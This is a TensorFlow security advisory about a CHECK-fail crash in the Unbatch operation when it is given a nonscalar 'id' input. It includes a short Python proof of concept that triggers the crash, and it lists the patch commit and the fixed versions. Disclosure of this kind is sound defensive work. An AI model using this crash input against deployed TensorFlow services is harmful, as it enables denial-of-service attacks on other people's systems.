summary: "TensorFlow vulnerable to `CHECK` fail in `Unbatch`\n### Impact\nWhen `Unbatch` receives\
  \ a nonscalar input `id`, it gives a `CHECK` fail that can trigger a denial of service attack.\n\
  ```python\nimport tensorflow as tf\nimport numpy as np\narg_0=tf.constant(value=np.random.random(size=(3,\
  \ 3, 1)), dtype=tf.float64)\narg_1=tf.constant(value=np.random.randint(0,100,size=(3, 3, 1)),\
  \ dtype=tf.int64)\narg_2=tf.constant(value=np.random.randint(0,100,size=(3, 3,  1)), dtype=tf.int64)\n\
  arg_3=47\narg_4=''\narg_5=''\ntf.raw_ops.Unbatch(batched_tensor=arg_0, batch_index=arg_1,\
  \ id=arg_2, \n                   timeout_micros=arg_3, container=arg_4, shared_name=arg_5)\n\
  ```\n\n### Patches\nWe have patched the issue in GitHub commit [4419d10d576adefa36b0e0a9425d2569f7c0189f](https://github.com/tensorflow/tensorflow/commit/4419d10d576adefa36b0e0a9425d2569f7c0189f).\n\
  \nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow\
  \ 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported\
  \ range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md)\
  \ for more information regarding the security model and how to contact us with issues and\
  \ questions.\n\n\n### Attribution\nThis vulnerability has been reported by 刘力源, Information\
  \ System & Security and Countermeasures Experiments Center, Beijing Institute of Technology."
